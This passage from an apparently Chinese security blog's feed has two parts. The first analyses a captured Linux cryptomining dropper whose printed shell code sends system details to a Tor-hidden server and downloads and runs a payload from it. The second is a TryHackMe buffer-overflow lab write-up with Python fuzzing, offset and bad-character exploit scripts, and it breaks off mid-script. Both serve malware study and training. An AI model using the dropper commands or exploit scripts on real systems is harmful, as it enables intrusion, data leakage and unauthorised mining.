&amp;&amp; .&#x2F;i &amp;&amp; rm -f i &amp;&amp; break;done # Check write privilege in directories</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">smhgcQXS() &#123;</span><br><span class="line">gJibwMpB&#x3D;&#x2F;exec</span><br><span class="line">JzNZygWM&#x3D;cr0_$(curl -4 ident.me||curl -4 ip.sb)_$(whoami)_$(uname -n)_$(uname -r)_$(cat &#x2F;etc&#x2F;machine-id||(ip r||hostname -i||echo no-id)|md5sum|awk NF&#x3D;1) #system info as referer</span><br><span class="line">$kzKYpBVr -x socks5h:&#x2F;&#x2F;$cVXfuVZo:9050 -e$JzNZygWM $vBZjGMxF.onion$gJibwMpB -o$ewvBBeCm || $kzKYpBVr -e$JzNZygWM $1$gJibwMpB -o$ewvBBeCm || $zKjJkVWF -x socks5h:&#x2F;&#x2F;$cVXfuVZo:9050 -e$JzNZygWM $vBZjGMxF.onion$gJibwMpB -o$ewvBBeCm || $zKjJkVWF -e$JzNZygWM $1$gJibwMpB -o$ewvBBeCm # ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.onion&#x2F;exec via proxy socks5h:&#x2F;&#x2F;relay.tor2socks.in:9500 or $1&#x2F;exec</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mYVeTLDP() &#123;</span><br><span class="line">chmod +x $ewvBBeCm;$ewvBBeCm;rm -f $ewvBBeCm # Execute</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BpNRKDeY() &#123;</span><br><span class="line">u&#x3D;$vBZjGMxF.tor2web.it&#x2F;load&#x2F;</span><br><span class="line">cd &#x2F;tmp &amp;&amp; curl -V || (SrTlIMkT http:&#x2F;&#x2F;$u&#x2F;cu) | tar zxp # Check curl, download curl if can&#39;t run it</span><br><span class="line">IvZZyoYs</span><br><span class="line">smhgcQXS $vBZjGMxF.tor2web.it ||</span><br><span class="line">smhgcQXS $vBZjGMxF.tor2web.in ||</span><br><span class="line">smhgcQXS $vBZjGMxF.tor2web.re</span><br><span class="line">mYVeTLDP</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ls &#x2F;proc&#x2F;$(head -1 &#x2F;tmp&#x2F;.systemd.1)&#x2F;maps || BpNRKDeY # Sandbox detection? Not sure.</span><br></pre></td></tr></table></figure><p>暂且叫这玩意<code>ESo1YS_Minder</code>吧</p><p>一步步看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp &amp;&amp; curl -V || (SrTlIMkT http:&#x2F;&#x2F;$u&#x2F;&#x2F;cu) | tar zxp</span><br></pre></td></tr></table></figure><p>这里是看有没有curl这个程序, 没有的话再进到后面的函数SrTlIMkT()</p><p>函数SrTlIMkT()丢进去的参数是<code>http://ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.tor2web.it/load//cu</code></p><p>域名是<code>ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.tor2web.it</code><br />端口是<code>80</code><br />建立起一个TCP Socket连接, 也就是fd 3, 之后开始发起一个HTTP请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;load&#x2F;cu&#x2F; HTTP&#x2F;1.0</span><br><span class="line">User-Agent: -</span><br><span class="line">Host: ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.tor2web.it</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后从fd 3获取HTTP响应内容<br />最后关闭这个Socket</p><p>下载解压后是一个curl程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;curl --version</span><br><span class="line">curl 7.85.0 (oasis) libcurl&#x2F;7.85.0 BearSSL zlib&#x2F;1.2.11</span><br><span class="line">Release-Date: 2022-08-31</span><br><span class="line">Protocols: dict file ftp ftps gopher gophers http https imap imaps mqtt rtsp smtp smtps telnet tftp </span><br><span class="line">Features: alt-svc AsynchDNS HSTS IPv6 Largefile libz SSL threadsafe UnixSockets</span><br></pre></td></tr></table></figure><p>函数IvZZyoYs()用于检查路径的写权限</p><p>函数smhgcQXS()用于下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">curl -m60 -fsSLkA- --doh-url https:&#x2F;&#x2F;$random_domain&#x2F;dns-query -x socks5h:&#x2F;&#x2F;relay.tor2socks.in:9050 -e$random_string ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.onion&#x2F;exec -o$random_string</span><br><span class="line"></span><br><span class="line">curl -m60 -fsSLkA- --doh-url https:&#x2F;&#x2F;$random_domain&#x2F;dns-query -e$random_string ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.tor2web.it&#x2F;exec -o$random_string</span><br><span class="line"></span><br><span class="line">curl -m60 -fsSLkA- -x socks5h:&#x2F;&#x2F;relay.tor2socks.in:9050 -e$random_string ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.onion&#x2F;exec -o$random_string</span><br><span class="line"></span><br><span class="line">curl -m60 -fsSLkA- -e$random_string ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.tor2web.it&#x2F;exec -o$random_string</span><br><span class="line"></span><br><span class="line">curl -m60 -fsSLkA- --doh-url https:&#x2F;&#x2F;$random_domain&#x2F;dns-query -e$random_string ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.tor2web.in&#x2F;exec -o$random_string</span><br><span class="line"></span><br><span class="line">curl -m60 -fsSLkA- -e$random_string ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.tor2web.in&#x2F;exec -o$random_string</span><br><span class="line"></span><br><span class="line">curl -m60 -fsSLkA- --doh-url https:&#x2F;&#x2F;$random_domain&#x2F;dns-query -e$random_string ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.tor2web.re&#x2F;exec -o$random_string</span><br><span class="line"></span><br><span class="line">curl -m60 -fsSLkA- -e$random_string ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.tor2web.re&#x2F;exec -o$random_string</span><br></pre></td></tr></table></figure><p>下载后得到文件md5为<code>73838d160eb7a23dfc8def07e8db1fa5</code><br />运行后貌似会再生成两个文件<code>4045022d9d8a7c30bf9bfeb869316787</code>和<code>dd4b52f33373c57093f1df396a76e058</code><br /><code>4045022d9d8a7c30bf9bfeb869316787</code>会对内网进行扫描, <code>dd4b52f33373c57093f1df396a76e058</code>则是挖矿程序<br />三个文件都是魔改UPX加壳, 需要手工脱壳, 等什么时候有时间看一下吧</p><hr /><p>IDA上linux远程调试会提示是so文件，需要在附加的进程中进行调试</p><p>用gdbserver调试会走进一个莫名其妙的syscall exit直接把程序退了，解压缩操作愣是没看见</p><p>估计是有反动调了</p><p>看来还是没能力脱这个壳</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;给枯燥的工作平添一分不确定性罢了&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Malware" scheme="https://yoloyolo.top/tags/Malware/"/>
    
  </entry>
  
  <entry>
    <title>TryHackMe_Buffer_Overflow_Prep</title>
    <link href="https://yoloyolo.top/2023/04/25/TryHackMe-Buffer-Overflow-Prep/"/>
    <id>https://yoloyolo.top/2023/04/25/TryHackMe-Buffer-Overflow-Prep/</id>
    <published>2023-04-24T17:01:13.000Z</published>
    <updated>2023-04-24T17:02:04.607Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="tryhackme-buffer-overflow-prep"><a class="markdownIt-Anchor" href="#tryhackme-buffer-overflow-prep"></a> TryHackMe Buffer Overflow Prep</h1><p><a href="https://anonymfile.com/RdEJW/bof.zip">https://anonymfile.com/RdEJW/bof.zip</a></p><h2 id="overflow1"><a class="markdownIt-Anchor" href="#overflow1"></a> OVERFLOW1</h2><h3 id="fuzz"><a class="markdownIt-Anchor" href="#fuzz"></a> FUZZ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># fuzz.py</span></span><br><span class="line"><span class="keyword">import</span> socket, time, sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW1 &quot;</span></span><br><span class="line"></span><br><span class="line">string = prefix + <span class="string">&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">s.settimeout(timeout)</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">s.send(<span class="built_in">bytes</span>(string, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line">string += <span class="number">100</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fuzzing crashed at 2000 bytes</span><br></pre></td></tr></table></figure><h3 id="offset"><a class="markdownIt-Anchor" href="#offset"></a> OFFSET</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW1 &quot;</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">overflow = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co&quot;</span></span><br><span class="line">retn = <span class="string">&quot;&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 6F43396E -&gt; oC9n -&gt; n9Co</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q n9Co -l 2000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Exact match at offset 1978</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW1 &quot;</span></span><br><span class="line">offset = <span class="number">1978</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 42424242 -&gt; BBBB</p><h3 id="badchar"><a class="markdownIt-Anchor" href="#badchar"></a> BADCHAR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># charset.py</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">print(<span class="string">&quot;\\x&quot;</span> + <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(x), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW1 &quot;</span></span><br><span class="line">offset = <span class="number">1978</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p></blockquote><p>BADCHAR: <code>\x00\x07\x08\x2e\x2f\xa0\xa1</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW1 &quot;</span></span><br><span class="line">offset = <span class="number">1978</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x9f\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span 